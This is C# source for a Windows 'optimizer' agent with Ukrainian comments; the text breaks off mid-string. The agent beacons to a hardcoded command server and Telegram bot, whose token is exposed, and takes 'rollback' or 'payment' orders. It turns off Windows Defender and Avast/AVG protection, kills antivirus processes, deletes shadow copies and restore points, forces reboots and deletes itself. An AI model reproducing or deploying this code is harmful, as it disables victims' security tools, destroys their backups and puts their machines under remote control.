using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using System.Threading;

namespace WinOptimizerAgent;

/// <summary>
/// WinOptimizer Agent v3.0 — cleanup only.
/// Rollback: System Restore Point → reboot.
/// Payment: видалити restore point → cleanup → self-delete.
/// </summary>
class Program
{
    [DllImport("srclient.dll")]
    static extern int SRRemoveRestorePoint(int dwRPNum);

    static readonly string DataDir = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
        "WinOptimizer", "Data");

    static readonly string LogFile = Path.Combine(DataDir, "agent.log");
    static readonly string ClientIdFile = Path.Combine(DataDir, "client_id.txt");
    static readonly string RollbackFile = Path.Combine(DataDir, "rollback_state.json");

    static readonly string LogDir = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
        "WinOptimizer", "Logs");
    static readonly string DesktopLogFile = Path.Combine(LogDir, "agent.log");

    // Діагностичний файл — пишеться ДО будь-чого іншого
    static readonly string DiagFile = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
        "WinOptimizer", "Logs", "agent_diag.txt");

    static readonly string PostRollbackMarker = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
        "WinOptimizer", "Data", "post_rollback.marker");

    static readonly string VpsApi = "http://84.238.132.84/api";
    static readonly string TgBotToken = "8394906281:AAEhRCN2hJxV7uPfZw-UnISXcAcHEHonago";
    static readonly string TgChatId = "942720632";

    static readonly HttpClient Http = new() { Timeout = TimeSpan.FromSeconds(15) };
    static string ClientId = "UNKNOWN";

    static void Main(string[] args)
    {
        // === КРОК 0: Діагностика — пишемо відразу при старті ===
        try
        {
            var diagDir = Path.GetDirectoryName(DiagFile);
            if (diagDir != null) Directory.CreateDirectory(diagDir);
            File.AppendAllText(DiagFile,
                $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] AGENT PROCESS STARTED PID={Environment.ProcessId}\n");
        }
        catch { }

        // Unhandled exception handler — ловимо ВСЕ
        AppDomain.CurrentDomain.UnhandledException += (sender, e) =>
        {
            var ex = e.ExceptionObject as Exception;
            var msg = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] UNHANDLED EXCEPTION: {ex}\n";
            try { File.AppendAllText(DiagFile, msg); } catch { }
            try { File.AppendAllText(LogFile, msg); } catch { }
            try
            {
                SendTg($"💀 Agent UNHANDLED CRASH\n🆔 {ClientId}\n{ex?.Message}");
            }
            catch { }
        };

        try
        {
            Directory.CreateDirectory(DataDir);
            Directory.CreateDirectory(LogDir);
            Log("=== WinOptimizerAgent v3.1 started ===");
            Log($"ExePath: {Environment.ProcessPath}");
            Log($"WorkDir: {Environment.CurrentDirectory}");
            Log($"Is64BitOS: {Environment.Is64BitOperatingSystem}, Is64BitProcess: {Environment.Is64BitProcess}");

            // Read client ID
            Log($"ClientIdFile path: {ClientIdFile}");
            Log($"ClientIdFile exists: {File.Exists(ClientIdFile)}");
            if (File.Exists(ClientIdFile))
            {
                ClientId = File.ReadAllText(ClientIdFile).Trim();
                Log($"Client ID loaded: '{ClientId}'");
            }
            else
            {
                Log("WARNING: client_id.txt NOT FOUND! Using UNKNOWN");
            }

            // Check rollback state
            var hasRollback = File.Exists(RollbackFile);
            var rollbackInfo = "немає";
            if (hasRollback)
            {
                try
                {
                    var rj = File.ReadAllText(RollbackFile);
                    using var rd = JsonDocument.Parse(rj);
                    var rp = rd.RootElement.TryGetProperty("RestorePointSequenceNumber", out var rpVal) ? rpVal.GetInt32() : 0;
                    rollbackInfo = $"RP#{rp}";
                }
                catch { rollbackInfo = "файл є, помилка парсингу"; }
            }
            Log($"RollbackFile: {RollbackFile}, exists: {hasRollback}, info: {rollbackInfo}");

            // Startup TG notification (в окремому try/catch щоб не крашнути Agent)
            try
            {
                SendTg($"🤖 WinOptimizer Agent v3.1 STARTED\n" +
                       $"🖥 {Environment.MachineName}\n" +
                       $"🆔 {ClientId}\n" +
                       $"📁 Rollback state: {rollbackInfo}\n" +
                       $"⏰ {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
            }
            catch (Exception ex)
            {
                Log($"TG startup notify error (non-fatal): {ex.Message}");
            }

            // === POST-ROLLBACK REPAIR: Якщо агент стартує після System Restore ===
            try
            {
                if (File.Exists(PostRollbackMarker))
                {
                    Log("=== POST-ROLLBACK REPAIR DETECTED ===");
                    SendTg($"🔧 Post-Rollback Repair\n🖥 {Environment.MachineName}\n🆔 {ClientId}\n⏳ Починаємо відновлення...");
                    PostRollbackRepair();
                    File.Delete(PostRollbackMarker);
                    Log("Post-rollback marker deleted");
                }
            }
            catch (Exception ex)
            {
                Log($"Post-rollback repair error (non-fatal): {ex.Message}");
            }

            // VPS registration (в окремому try/catch)
            try
            {
                RegisterOnVps();
            }
            catch (Exception ex)
            {
                Log($"VPS register error (non-fatal): {ex.Message}");
            }

            Log("Entering heartbeat loop...");

            // Main heartbeat loop
            int heartbeatCount = 0;
            while (true)
            {
                try
                {
                    heartbeatCount++;
                    Heartbeat();

                    if (heartbeatCount % 20 == 0)
                        Log($"Heartbeat #{heartbeatCount} — agent alive");
                }
                catch (Exception ex)
                {
                    Log($"Heartbeat loop error (non-fatal): {ex.Message}");
                    if (ex.InnerException != null)
                        Log($"  Inner: {ex.InnerException.Message}");
                }

                Thread.Sleep(30000); // 30 sec
            }
        }
        catch (Exception ex)
        {
            var msg = $"FATAL: {ex}";
            Log(msg);
            try { File.AppendAllText(DiagFile, $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {msg}\n"); } catch { }
            try { SendTg($"💀 Agent FATAL CRASH\n🆔 {ClientId}\n{ex.Message}"); } catch { }
        }
    }

    static void RegisterOnVps()
    {
        try
        {
            var payload = JsonSerializer.Serialize(new
            {
                client_id = ClientId,
                hwid = ClientId,
                pc_name = Environment.MachineName,
                status = "agent_running",
                project = "winoptimizer"
            });

            using var content = new StringContent(payload, Encoding.UTF8, "application/json");
            var response = Http.PostAsync($"{VpsApi}/register", content).Result;
            Log($"VPS register: {response.StatusCode}");
        }
        catch (Exception ex)
        {
            Log($"VPS register error: {ex.Message}");
        }
    }

    static void Heartbeat()
    {
        try
        {
            var payload = JsonSerializer.Serialize(new
            {
                client_id = ClientId,
                status = "agent_running",
                project = "winoptimizer"
            });

            using var content = new StringContent(payload, Encoding.UTF8, "application/json");
            var response = Http.PostAsync($"{VpsApi}/heartbeat", content).Result;
            var json = response.Content.ReadAsStringAsync().Result;
            Log($"Heartbeat response: {json}");

            using var doc = JsonDocument.Parse(json);
            var root = doc.RootElement;

            if (root.TryGetProperty("pending_action", out var action))
            {
                var actionStr = action.GetString();
                if (!string.IsNullOrEmpty(actionStr) && actionStr != "none")
                {
                    Log($">>> PENDING ACTION RECEIVED: '{actionStr}'");
                    SendTg($"📬 Agent отримав команду!\n🆔 {ClientId}\n📋 Action: {actionStr}\n⏰ {DateTime.Now:HH:mm:ss}");

                    var act = actionStr.ToLowerInvariant();

                    if (act.Contains("rollback"))
                    {
                        Log(">>> Executing ROLLBACK...");
                        ExecuteRollback();
                    }
                    else if (act.Contains("paid") || act.Contains("payment"))
                    {
                        Log(">>> Executing PAYMENT...");
                        ExecutePayment();
                    }
                    else
                    {
                        Log($"Unknown action: {actionStr}");
                        SendTg($"❓ Agent: невідома команда\n{actionStr}");
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Log($"Heartbeat error: {ex.Message}");
        }
    }

    static void ExecuteRollback()
    {
        Log("=== ROLLBACK START ===");
        SendTg($"🔄 WinFlow Rollback\n🖥 {Environment.MachineName}\n🆔 {ClientId}\n⏳ Починаємо відкат...");

        try
        {
            // Clean WinOptimizer files from Desktop BEFORE rollback
            CleanDesktopFromWinOptimizer();

            if (!File.Exists(RollbackFile))
            {
                Log("No rollback state found");
                SendTg($"⚠️ Rollback: файл стану не знайдено\n🆔 {ClientId}");
                return;
            }

            var json = File.ReadAllText(RollbackFile);
            Log($"Rollback state content: {json.Substring(0, Math.Min(json.Length, 500))}");
            using var doc = JsonDocument.Parse(json);
            var root = doc.RootElement;

            ExecuteCleanupRollback(root);
        }
        catch (Exception ex)
        {
            Log($"ROLLBACK ERROR: {ex}");
            SendTg($"❌ Rollback FAILED\n🆔 {ClientId}\n{ex.Message}");
        }
    }

    /// <summary>
    /// Видалити ВСІ файли WinOptimizer/WinFlow з Desktop (всіх користувачів).
    /// exe, логи, будь-що з "WinOptimizer" або "WinFlow" у назві.
    /// </summary>
    static void CleanDesktopFromWinOptimizer()
    {
        Log("Cleaning WinOptimizer files from Desktop...");
        int deleted = 0;

        try
        {
            var desktopDirs = new List<string>();

            // Public Desktop
            var publicDesktop = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
            if (!string.IsNullOrEmpty(publicDesktop) && Directory.Exists(publicDesktop))
                desktopDirs.Add(publicDesktop);

            // Current user Desktop
            var userDesktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            if (!string.IsNullOrEmpty(userDesktop) && Directory.Exists(userDesktop))
                desktopDirs.Add(userDesktop);

            // All user profiles Desktop
            var usersDir = Path.Combine(Path.GetPathRoot(Environment.SystemDirectory) ?? "C:\\", "Users");
            if (Directory.Exists(usersDir))
            {
                foreach (var profile in Directory.GetDirectories(usersDir))
                {
                    var profileDesktop = Path.Combine(profile, "Desktop");
                    if (Directory.Exists(profileDesktop) && !desktopDirs.Contains(profileDesktop))
                        desktopDirs.Add(profileDesktop);
                }
            }

            foreach (var desktop in desktopDirs)
            {
                try
                {
                    foreach (var file in Directory.GetFiles(desktop))
                    {
                        var name = Path.GetFileName(file).ToLowerInvariant();
                        if (name.Contains("winoptimizer") || name.Contains("winflow"))
                        {
                            try
                            {
                                File.Delete(file);
                                deleted++;
                                Log($"Deleted from Desktop: {file}");
                            }
                            catch (Exception ex)
                            {
                                Log($"Cannot delete {file}: {ex.Message}");
                            }
                        }
                    }
                }
                catch { }
            }
        }
        catch (Exception ex)
        {
            Log($"CleanDesktop error: {ex.Message}");
        }

        Log($"Desktop cleanup: deleted {deleted} WinOptimizer files");
    }

    /// <summary>
    /// Cleanup rollback v2.0 — System Restore Point з pre-checks та fallback.
    ///
    /// Стратегія:
    /// 1. Pre-flight: VSS health, служби, диск
    /// 2. Метод 1: Restore-Computer (PowerShell)
    /// 3. Метод 2: WMI SystemRestore.Restore() (COM)
    /// 4. Метод 3: rstrui.exe (GUI, автоматично)
    /// 5. Fallback: Manual rollback (служби + автозапуск)
    /// </summary>
    static void ExecuteCleanupRollback(JsonElement root)
    {
        int seqNum = 0;
        if (root.TryGetProperty("RestorePointSequenceNumber", out var rpSeq))
            seqNum = rpSeq.GetInt32();

        Log($"Cleanup rollback v2.0: RestorePointSequenceNumber = {seqNum}");

        if (seqNum > 0)
        {
            // === PRE-FLIGHT: Підготовка системи до відкату ===
            Log("=== PRE-FLIGHT CHECKS ===");
            PrepareSystemForRestore();

            // Verify restore point exists
            Log("Checking if restore point exists...");
            var checkCmd = $"Get-ComputerRestorePoint | Where-Object {{ $_.SequenceNumber -eq {seqNum} }} | Format-List";
            var checkOutput = RunPowerShellWithOutput(checkCmd, 30000);
            Log($"Restore point check: {(string.IsNullOrWhiteSpace(checkOutput) ? "NOT FOUND!" : checkOutput.Trim())}");

            var listCmd = "Get-ComputerRestorePoint | Select-Object SequenceNumber,Description,CreationTime | Format-Table -AutoSize";
            var listOutput = RunPowerShellWithOutput(listCmd, 15000);
            Log($"All restore points:\n{listOutput}");

            if (string.IsNullOrWhiteSpace(checkOutput))
            {
                Log($"Restore point #{seqNum} NOT FOUND! Trying latest available...");

                // Спробувати знайти будь-яку WinOptimizer точку
                var latestCmd = "Get-ComputerRestorePoint | Where-Object { $_.Description -like '*WinOptimizer*' } | " +
                    "Sort-Object SequenceNumber -Descending | Select-Object -First 1 -ExpandProperty SequenceNumber";
                var latestOutput = RunPowerShellWithOutput(latestCmd, 15000);

                if (int.TryParse(latestOutput.Trim(), out int latestSeq) && latestSeq > 0)
                {
                    Log($"Found alternative WinOptimizer restore point: #{latestSeq}");
                    seqNum = latestSeq;
                }
                else
                {
                    // Спробувати будь-яку останню точку
                    var anyCmd = "Get-ComputerRestorePoint | Sort-Object SequenceNumber -Descending | " +
                        "Select-Object -First 1 -ExpandProperty SequenceNumber";
                    var anyOutput = RunPowerShellWithOutput(anyCmd, 15000);

                    if (int.TryParse(anyOutput.Trim(), out int anySeq) && anySeq > 0)
                    {
                        Log($"Using any available restore point: #{anySeq}");
                        seqNum = anySeq;
                    }
                    else
                    {
                        Log("NO restore points found at all! Falling back to manual...");
                        SendTg($"❌ Жодної точки відновлення не знайдено!\n🆔 {ClientId}\nПереходимо на ручний відкат...");
                        goto ManualRollback;
                    }
                }
            }

            // Записати маркер для post-rollback repair ПЕРЕД рестором
            try
            {
                Directory.CreateDirectory(Path.GetDirectoryName(PostRollbackMarker)!);
                File.WriteAllText(PostRollbackMarker, $"{DateTime.Now:yyyy-MM-dd HH:mm:ss}|RP#{seqNum}|{ClientId}");
                Log($"Post-rollback marker created: {PostRollbackMarker}");
            }
            catch (Exception ex)
            {
                Log($"WARNING: Cannot create post-rollback marker: {ex.Message}");
            }

            SendTg($"🔄 System Restore v2.0\n🖥 {Environment.MachineName}\n🆔 {ClientId}\n📍 Точка #{seqNum}\n⏳ Відкат запускається...\nПК перезавантажиться автоматично!");

            // === МЕТОД 1: Restore-Computer (PowerShell) ===
            Log($"METHOD 1: Restore-Computer -RestorePoint {seqNum}...");
            var restoreCmd = $"Restore-Computer -RestorePoint {seqNum} -Confirm:$false 2>&1";
            var restoreOutput = RunPowerShellWithOutput(restoreCmd, 120000);
            Log($"Restore-Computer output: {restoreOutput}");

            // Перевірити чи Restore-Computer не повернув помилку
            bool method1Failed = restoreOutput.Contains("Exception") ||
                                  restoreOutput.Contains("Error") ||
                                  restoreOutput.Contains("failed") ||
                                  restoreOutput.Contains("не удалось");

            if (!method1Failed)
            {
                Log("METHOD 1 appears successful, scheduling reboot...");
                ScheduleReboot("WinFlow: System Restore");
                UpdateVpsStatus("rollback_system_restore");
                SendTg($"✅ System Restore ініційовано (метод 1)!\n🆔 {ClientId}\n📍 Точка #{seqNum}\n🔄 ПК перезавантажується...");
                return;
            }

            Log($"METHOD 1 FAILED! Output: {restoreOutput.Trim()}");

            // === МЕТОД 2: WMI SystemRestore.Restore() ===
            Log($"METHOD 2: WMI SystemRestore.Restore({seqNum})...");
            var wmiCmd = $"$restoreClass = [wmiclass]'\\\\localhost\\root\\default:SystemRestore'; " +
                $"$result = $restoreClass.Restore({seqNum}); Write-Output \"WMI_RESULT=$($result.ReturnValue)\"";
            var wmiOutput = RunPowerShellWithOutput(wmiCmd, 60000);
            Log($"WMI Restore output: {wmiOutput}");

            bool method2Success = wmiOutput.Contains("WMI_RESULT=0");

            if (method2Success && !wmiOutput.Contains("Exception") && !wmiOutput.Contains("Error"))
            {
                Log("METHOD 2 appears successful, scheduling reboot...");
                ScheduleReboot("WinFlow: System Restore (WMI)");
                UpdateVpsStatus("rollback_system_restore_wmi");
                SendTg($"✅ System Restore ініційовано (метод 2 WMI)!\n🆔 {ClientId}\n📍 Точка #{seqNum}\n🔄 ПК перезавантажується...");
                return;
            }

            Log($"METHOD 2 FAILED! Output: {wmiOutput.Trim()}");

            // === МЕТОД 3: rstrui.exe (System Restore UI) ===
            Log($"METHOD 3: rstrui.exe /OFFLINE:C:\\Windows=active...");
            try
            {
                var sys32 = GetRealSystem32();
                var rstruiPath = Path.Combine(sys32, "rstrui.exe");

                if (File.Exists(rstruiPath))
                {
                    // rstrui.exe не має параметрів для silent mode, але можемо запустити
                    // стандартний System Restore GUI — хоча б покаже юзеру інтерфейс
                    var psi = new ProcessStartInfo
                    {
                        FileName = rstruiPath,
                        UseShellExecute = true
                    };
                    Process.Start(psi);
                    Log("rstrui.exe launched — user can manually select restore point");
                    SendTg($"⚠️ Автоматичний відкат не вдався!\n🖥 {Environment.MachineName}\n🆔 {ClientId}\n📍 Точка #{seqNum}\n\n" +
                        $"Запущено rstrui.exe — юзер побачить інтерфейс System Restore і може зробити відкат вручну.\n\n" +
                        $"Якщо і це не допоможе — буде ручний відкат служб.");
                    UpdateVpsStatus("rollback_rstrui_launched");
                    return;
                }
            }
            catch (Exception ex)
            {
                Log($"METHOD 3 FAILED: {ex.Message}");
            }

            Log("ALL 3 METHODS FAILED! Falling back to manual rollback...");
            SendTg($"❌ Всі методи відкату не вдались!\n🖥 {Environment.MachineName}\n🆔 {ClientId}\n\nПереходимо на ручний відкат служб...");
        }

        // === FALLBACK: Manual rollback (services + startup) ===
        ManualRollback:
        Log("=== MANUAL ROLLBACK ===");
        int restoredServices = 0;
        int restoredStartup = 0;

        if (root.TryGetProperty("DisabledServices", out var services))
        {
            foreach (var svc in services.EnumerateArray())
            {
                var name = svc.GetProperty("ServiceName").GetString() ?? "";
                var startType = svc.GetProperty("OriginalStartType").GetString() ?? "Manual";
                Log($"Restoring service: {name} → {startType}");
                RunPowerShell($"Set-Service -Name '{name}' -StartupType {startType}; Start-Service -Name '{name}' -ErrorAction SilentlyContinue");
                restoredServices++;
            }
        }

        if (root.TryGetProperty("DisabledStartupItems", out var startup))
        {
            foreach (var item in startup.EnumerateArray())
            {
                var regPath = item.GetProperty("RegistryPath").GetString() ?? "";
                var valueName = item.GetProperty("ValueName").GetString() ?? "";
                var valueData = item.GetProperty("ValueData").GetString() ?? "";
                Log($"Restoring startup: {valueName}");
                RunPowerShell($"Set-ItemProperty -Path '{regPath}' -Name '{valueName}' -Value '{valueData}' -Force");
                restoredStartup++;
            }
        }

        try { File.Delete(RollbackFile); } catch { }
        Log($"Manual rollback done: {restoredServices} services, {restoredStartup} startup items");
        SendTg($"✅ Manual Rollback OK\n🖥 {Environment.MachineName}\n🆔 {ClientId}\n🔧 Служб: {restoredServices}\n🚀 Автозапуск: {restoredStartup}");
        UpdateVpsStatus("rollback_manual_done");
    }

    /// <summary>
    /// Pre-flight: Підготовка системи для System Restore.
    /// Перезапуск VSS, очистка блокуючих процесів, перевірка диску.
    /// </summary>
    static void PrepareSystemForRestore()
    {
        try
        {
            // 1. Перезапустити VSS + System Restore служби
            Log("[PreFlight] Restarting VSS and SR services...");
            RunPowerShell(
                "Stop-Service -Name VSS -Force -ErrorAction SilentlyContinue; " +
                "Stop-Service -Name swprv -Force -ErrorAction SilentlyContinue; " +
                "Start-Sleep -Seconds 2; " +
                "Start-Service -Name VSS -ErrorAction SilentlyContinue; " +
                "Start-Service -Name swprv -ErrorAction SilentlyContinue; " +
                "Start-Service -Name srservice -ErrorAction SilentlyContinue");

            // 2. Зупинити Windows Defender (може блокувати файли)
            Log("[PreFlight] Disabling Defender real-time protection temporarily...");
            RunPowerShell("Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue");

            // 3. Зупинити Windows Search (блокує файли)
            Log("[PreFlight] Stopping WSearch service...");
            RunPowerShell("Stop-Service -Name WSearch -Force -ErrorAction SilentlyContinue");

            // 4. Зупинити Windows Update (може конфліктувати)
            Log("[PreFlight] Stopping wuauserv service...");
            RunPowerShell("Stop-Service -Name wuauserv -Force -ErrorAction SilentlyContinue");

            // 4.5. Зупинити Edge Update (помилка 0x80070003 при відкаті!)
            Log("[PreFlight] Stopping Edge Update services...");
            RunPowerShell(
                "Stop-Service -Name 'edgeupdate' -Force -ErrorAction SilentlyContinue; " +
                "Stop-Service -Name 'edgeupdatem' -Force -ErrorAction SilentlyContinue; " +
                "Stop-Service -Name 'MicrosoftEdgeElevationService' -Force -ErrorAction SilentlyContinue; " +
                "Get-Process -Name 'msedge', 'MicrosoftEdgeUpdate' -ErrorAction SilentlyContinue | " +
                "Stop-Process -Force -ErrorAction SilentlyContinue");

            // 4.6. Відключити Avast/AVG Self-Protection + зупинити служби
            // (Avast може блокувати агента під час відкату!)
            Log("[PreFlight] Disabling Avast/AVG self-protection...");
            RunPowerShell(
                // Відключити self-protection через реєстр
                "$regPaths = @(" +
                "  'HKLM:\\SOFTWARE\\AVAST Software\\Avast\\persistency'," +
                "  'HKLM:\\SOFTWARE\\AVG\\Persistent Data\\AVG Antivirus\\persistency'" +
                "); " +
                "foreach ($p in $regPaths) { " +
                "  if (Test-Path $p) { Set-ItemProperty -Path $p -Name 'SelfDefense' -Value 0 -ErrorAction SilentlyContinue } " +
                "}; " +
                // Зупинити kernel driver
                "sc.exe stop aswSP 2>$null; " +
                "sc.exe stop aswSnx 2>$null; " +
                "sc.exe stop aswMonFlt 2>$null; " +
                // Зупинити служби
                "$svcs = @('avast! Antivirus','AvastWscReporter','aswbidsagent','aswEngSrv','AVGSvc','avgwd'); " +
                "foreach ($s in $svcs) { Stop-Service -Name $s -Force -ErrorAction SilentlyContinue }; " +
                // Вбити процеси
                "$procs = @('avastui','avastsvc','afwServ','avgui','avgsvc','avguard'); " +
                "foreach ($p in $procs) { " +
                "  Get-Process -Name $p -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue " +
                "}");

            // 5. Очистити pending file rename operations (часта причина збою!)
            Log("[PreFlight] Checking pending file operations...");
            var pendingCheck = RunPowerShellWithOutput(
                "try { " +
                "  $val = Get-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager' -Name 'PendingFileRenameOperations' -ErrorAction Stop; " +
                "  $count = $val.PendingFileRenameOperations.Count; " +
                "  Write-Output \"PENDING=$count\" " +
                "} catch { Write-Output 'PENDING=0' }", 10000);
            Log($"[PreFlight] {pendingCheck.Trim()}");

            if (pendingCheck.Contains("PENDING=") && !pendingCheck.Contains("PENDING=0"))
            {
                Log("[PreFlight] Clearing pending file operations to prevent restore failure...");
                RunPowerShell(
                    "Remove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager' " +
                    "-Name 'PendingFileRenameOperations' -Force -ErrorAction SilentlyContinue");
                Log("[PreFlight] Pending operations cleared");
            }

            // 6. Вільне місце на диску
            var diskInfo = RunPowerShellWithOutput(
                "$d = Get-WmiObject Win32_LogicalDisk -Filter \"DeviceID='C:'\"; " +
                "Write-Output \"DISK_FREE_GB=$([math]::Round($d.FreeSpace/1GB,1))\"", 10000);
            Log($"[PreFlight] {diskInfo.Trim()}");

            // 7. Перевірити VSS health
            var vssCheck = RunPowerShellWithOutput(
                "$out = vssadmin list writers 2>&1; " +
                "$failed = ($out | Select-String -Pattern 'Failed|Ошибка' | Measure-Object).Count; " +
                "Write-Output \"VSS_FAILED=$failed\"", 15000);
            Log($"[PreFlight] {vssCheck.Trim()}");

            if (vssCheck.Contains("VSS_FAILED=") && !vssCheck.Contains("VSS_FAILED=0"))
            {
                Log("[PreFlight] VSS writers have errors! Resetting VSS...");
                RunPowerShell(
                    "Restart-Service -Name VSS -Force -ErrorAction SilentlyContinue; " +
                    "Start-Sleep -Seconds 3");
            }

            Log("[PreFlight] System prepared for restore");
        }
        catch (Exception ex)
        {
            Log($"[PreFlight] Error (non-critical): {ex.Message}");
        }
    }

    static void ScheduleReboot(string reason)
    {
        Log("Scheduling backup reboot in 30 seconds...");
        var sys32 = GetRealSystem32();
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = Path.Combine(sys32, "shutdown.exe"),
                Arguments = $"/r /t 30 /c \"{reason} — перезавантаження\"",
                UseShellExecute = false,
                CreateNoWindow = true
            };
            Process.Start(psi);
            Log("Backup reboot scheduled (30s)");
        }
        catch (Exception ex)
        {
            Log($"Shutdown schedule error: {ex.Message}");
        }
    }

    static void ExecutePayment()
    {
        Log("=== PAYMENT START ===");
        SendTg($"💰 WinFlow Payment\n🖥 {Environment.MachineName}\n🆔 {ClientId}\n⏳ Очистка...");

        try
        {
            // Clean WinOptimizer files from Desktop
            CleanDesktopFromWinOptimizer();

            // Delete restore point
            if (File.Exists(RollbackFile))
            {
                try
                {
                    var json = File.ReadAllText(RollbackFile);
                    Log($"Rollback state: {json.Substring(0, Math.Min(json.Length, 300))}");
                    using var doc = JsonDocument.Parse(json);
                    var root = doc.RootElement;

                    if (root.TryGetProperty("RestorePointSequenceNumber", out var rpSeq))
                    {
                        var seqNum = rpSeq.GetInt32();
                        if (seqNum > 0)
                        {
                            Log($"Deleting restore point #{seqNum} via SRRemoveRestorePoint...");
                            var result = SRRemoveRestorePoint(seqNum);
                            Log(result == 0
                                ? $"✅ Restore point #{seqNum} deleted successfully"
                                : $"⚠️ SRRemoveRestorePoint returned {result} (0=success)");

                            if (result != 0)
                            {
                                Log("Trying PowerShell fallback delete...");
                                var psResult = RunPowerShellWithOutput(
                                    $"vssadmin delete shadows /for=C: /quiet 2>&1; Write-Output 'done'", 30000);
                                Log($"PS delete result: {psResult.Trim()}");
                            }
                        }
                        else
                        {
                            Log("No restore point to delete (seqNum=0)");
                        }
                    }
                }
                catch (Exception ex)
                {
                    Log($"Payment cleanup error: {ex.Message}");
                }

                File.Delete(RollbackFile);
                Log("Rollback state file deleted");
            }
            else
            {
                Log("No rollback state file found");
            }

            // Delete scheduled task
            var sys32 = GetRealSystem32();
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = Path.Combine(sys32, "schtasks.exe"),
                    Arguments = "/Delete /TN \"WinOptimizerAgent\" /F",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                Process.Start(psi)?.WaitForExit(5000);
                Log("Scheduled task deleted");
            }
            catch (Exception ex)
            {
                Log($"Delete task error: {ex.Message}");
            }

            // Report
            var cFreeGB = "?";
            try
            {
                var di = new DriveInfo("C");
                cFreeGB = $"{di.AvailableFreeSpace / (1024.0 * 1024 * 1024):F1}";
            }
            catch { }

            SendTg($"✅ WinOptimizer Payment OK\n🖥 {Environment.MachineName}\n🆔 {ClientId}\n💾 C: {cFreeGB} GB вільно\n🗑 Restore point видалено");
            UpdateVpsStatus("paid_done");

            // Self-delete
            SelfDelete();
        }
        catch (Exception ex)
        {
            Log($"PAYMENT ERROR: {ex}");
            SendTg($"❌ Payment FAILED\n🆔 {ClientId}\n{ex.Message}");
        }
    }

    /// <summary>
    /// Post-rollback repair: фікс звуку, драйверів, завершення System Restore.
    /// Викликається коли Agent стартує після System Restore і знаходить маркер-файл.
    /// </summary>
    static void PostRollbackRepair()
    {
        Log("=== POST-ROLLBACK REPAIR START ===");
        var results = new List<string>();

        // 1. Завершити System Restore якщо "восстановление не завершено"
        try
        {
            Log("[Repair] Finalizing System Restore via rstrui.exe...");
            // Скидаємо pending restore operations через registry
            var psFinalize = @"
                $ErrorActionPreference = 'SilentlyContinue'

                # Перевірити чи є pending restore operation
                $pendingKey = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore'
                $rpPending = Get-ItemProperty -Path $pendingKey -Name 'RPSessionInterval' -ErrorAction SilentlyContinue

                # Скинути прапорець незавершеного відновлення
                $srKey = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore\Setup'
                if (Test-Path $srKey) {
                    Remove-ItemProperty -Path $srKey -Name 'SetupInProgress' -ErrorAction SilentlyContinue
                }

                # Очистити pending file rename operations (часта причина помилок після restore)
                $sessionManager = 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager'
                $pending = Get-ItemProperty -Path $sessionManager -Name 'PendingFileRenameOperations' -ErrorAction SilentlyContinue
                if ($pending) {
                    Remove-ItemProperty -Path $sessionManager -Name 'PendingFileRenameOperations' -Force -ErrorAction SilentlyContinue
                    Write-Output 'Cleared PendingFileRenameOperations'
                }

                Write-Output 'SystemRestore finalize OK'
            ";
            var finalizeResult = RunPowerShellWithOutput(psFinalize, 15000);
            Log($"[Repair] Finalize result: {finalizeResult.Trim()}");
            results.Add($"✅ System Restore finalize: {finalizeResult.Trim()}");
        }
        catch (Exception ex)
        {
            Log($"[Repair] Finalize error: {ex.Message}");
            results.Add($"⚠️ SR finalize: {ex.Message}");
        }

        // 2. Фікс звуку — перезапуск аудіо-служб
        try
        {
            Log("[Repair] Fixing audio services...");
            var psAudio = @"
                $ErrorActionPreference = 'SilentlyContinue'
                $audioServices = @('Audiosrv', 'AudioEndpointBuilder', 'AudioSrv')
                $fixed = 0

                foreach ($svc in $audioServices) {
                    $service = Get-Service -Name $svc -ErrorAction SilentlyContinue
                    if ($service) {
                        # Встановити автозапуск
                        Set-Service -Name $svc -StartupType Automatic -ErrorAction SilentlyContinue

                        # Зупинити
                        Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
                        Start-Sleep -Seconds 1

                        # Запустити
                        Start-Service -Name $svc -ErrorAction SilentlyContinue
                        Start-Sleep -Seconds 1

                        $status = (Get-Service -Name $svc).Status
                        Write-Output ""$svc : $status""
                        $fixed++
                    }
                }

                # Також перезапустити Windows Audio Device Graph Isolation
                $audioGraph = Get-Service -Name 'AudioDG' -ErrorAction SilentlyContinue
                if ($audioGraph) {
                    Stop-Service -Name 'AudioDG' -Force -ErrorAction SilentlyContinue
                    Start-Sleep -Seconds 1
                    # AudioDG запуститься автоматично коли потрібно
                    Write-Output 'AudioDG restarted'
                }

                Write-Output ""Audio services fixed: $fixed""
            ";
            var audioResult = RunPowerShellWithOutput(psAudio, 20000);
            Log($"[Repair] Audio result: {audioResult.Trim()}");
            results.Add($"🔊 Audio: {audioResult.Trim().Replace("\r\n", " | ")}");
        }
        catch (Exception ex)
        {
            Log($"[Repair] Audio error: {ex.Message}");
            results.Add($"⚠️ Audio: {ex.Message}");
        }

        // 3. Сканування та переінсталяція драйверів
        try
        {
            Log("[Repair] Scanning for devices/drivers...");
            var psDrv = @"
                $ErrorActionPreference = 'SilentlyContinue'

                # Сканування нових пристроїв (PnP)
